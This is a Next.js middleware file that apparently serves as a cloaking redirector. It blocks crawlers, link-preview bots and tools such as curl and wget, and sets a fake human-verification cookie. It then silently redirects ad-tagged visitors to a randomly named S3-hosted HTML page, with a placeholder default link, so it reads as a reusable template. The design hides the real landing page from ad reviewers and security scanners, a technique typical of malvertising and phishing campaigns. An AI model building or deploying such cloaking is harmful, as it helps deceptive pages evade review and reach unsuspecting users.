import { NextResponse } from 'next/server'

const botRegex =
  /(bot|crawler|spider|curl|wget|python|httpclient|preview|facebookexternalhit|slackbot|discordbot)/i

export function middleware(request) {
  const url = request.nextUrl
  const adParam = url.searchParams.get('ad')
  const userAgent = request.headers.get('user-agent') || ''
  const verified = request.cookies.get('human_verified')

  // Block obvious bots
  if (botRegex.test(userAgent)) {
    return new NextResponse('Forbidden', { status: 403 })
  }

  // JS challenge (human verification)
  if (!verified) {
    const html = `
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="utf-8">
        <title>Verifying…</title>
      </head>
      <body>
        <script>
          document.cookie =
            "human_verified=true; path=/; max-age=600; SameSite=Lax";
          window.location.href = window.location.href;
        </script>
        <noscript>Please enable JavaScript to continue.</noscript>
      </body>
      </html>
    `
    return new NextResponse(html, {
      headers: { 'content-type': 'text/html' }
    })
  }

  // Redirect when ?ad=ad
  if (adParam === 'ad') {
    return NextResponse.redirect(
      'https://dve-fkh0lws9u.s3.us-east-2.amazonaws.com/1084-bd65-0759fxved.html',
      { status: 301 }
    )
  }

  // Default redirect
  return NextResponse.redirect(
    'https://YOUR-DEFAULT-LINK-HERE',
    { status: 302 }
  )
}

export const config = {
  matcher: ['/']
}
